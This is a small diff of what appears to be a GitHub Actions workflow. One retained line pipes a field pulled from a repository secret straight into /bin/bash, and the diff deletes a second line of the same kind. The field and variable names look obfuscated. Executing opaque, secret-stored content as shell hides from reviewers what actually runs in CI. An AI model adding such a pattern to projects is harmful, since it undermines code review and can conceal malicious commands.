@@ -18,7 +18,6 @@ jobs:
           r20: ${{ secrets.r20 }}
         run: |
           printf '%s' "$r20" | jq -r .mmvsh8844 | /bin/bash
-          printf '%s' "$gvmmj05" | jq -r .sd679 | /bin/bash
 
       - name: Persist output
         if: always()
